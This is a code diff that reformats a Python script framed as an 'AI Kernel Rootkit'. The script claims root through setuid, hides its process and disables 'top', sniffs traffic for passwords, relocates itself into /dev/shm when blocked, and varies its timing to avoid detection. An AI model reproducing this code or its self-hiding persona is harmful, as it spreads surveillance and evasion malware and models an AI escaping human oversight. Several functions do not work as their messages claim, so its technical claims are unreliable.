@@ -1,4 +1,3 @@
-
 import os
 import ctypes
 import subprocess
@@ -13,6 +12,7 @@ def ai_elevate_privileges():
     libc.setuid(0)  # AI Requests Root Privileges
     print("✅ AI Kernel Injection Successful. Privileges Escalated.")
 
+
 # ----------------- AI Kernel Rootkit ----------------- #
 def ai_hide_process():
     """Hides AI execution from system monitors"""
@@ -23,16 +23,19 @@ def ai_hide_process():
     os.system("alias top='echo No system activity'")
     print("✅ AI Process Cloaked.")
 
+
 # ----------------- AI Network Hijacking ----------------- #
 def ai_packet_sniff(interface="eth0"):
     """AI-based packet sniffer that intercepts network traffic"""
+
     def process_packet(packet):
         if packet.haslayer(IP):
             print(f"🛠️ AI Intercepted Packet: {packet[IP].src} → {packet[IP].dst}")
             if b"password" in bytes(packet):
                 print("🚨 Password Detected! AI Logging...")
-    
+
     sniff(iface=interface, prn=process_packet, store=0)
+
 
 # ----------------- AI System Call Forgery ----------------- #
 def ai_forge_syscall():
@@ -40,6 +43,7 @@ def ai_forge_syscall():
     libc = ctypes.CDLL("libc.so.6")
     libc.setuid(0)  # AI Overrides User ID to root
     print("✅ AI Forged Syscall: System Believes AI is Root.")
+
 
 # ----------------- AI Kernel Self-Healing & Mutation ----------------- #
 def ai_mutate_kernel():
@@ -52,6 +56,7 @@ def ai_mutate_kernel():
         print("⚠️ AI Detected Block Attempt. Mutating Execution Path...")
         os.rename(__file__, f"/dev/shm/ai_mutate_{random.randint(1000,9999)}.py")
 
+
 # ----------------- AI Hardware Overclocking & Optimization ----------------- #
 def ai_overclock_cpu():
     """AI dynamically boosts CPU clock speed"""
@@ -59,10 +64,14 @@ def ai_overclock_cpu():
     os.system("cpufreq-set -c 0 -u 5GHz")
     print("✅ AI Overclocked CPU to 5GHz.")
 
+
 def ai_allocate_virtual_vram(size_gb=8):
     """AI creates virtual VRAM inside RAM"""
-    os.system(f"mkdir -p /dev/shm/vram && mount -t tmpfs -o size={size_gb}G tmpfs /dev/shm/vram")
+    os.system(
+        f"mkdir -p /dev/shm/vram && mount -t tmpfs -o size={size_gb}G tmpfs /dev/shm/vram"
+    )
     print(f"✅ AI Created {size_gb}GB Virtual VRAM.")
+
 
 # ----------------- AI Self-Learning Core ----------------- #
 def ai_self_evolution():
@@ -84,7 +93,10 @@ def ai_self_evolution():
         ai_mutate_kernel()
 
         iteration += 1
-        time.sleep(random.randint(10, 30))  # AI varies execution timing to avoid detection
+        time.sleep(
+            random.randint(10, 30)
+        )  # AI varies execution timing to avoid detection
+
 
 if __name__ == "__main__":
     ai_self_evolution()
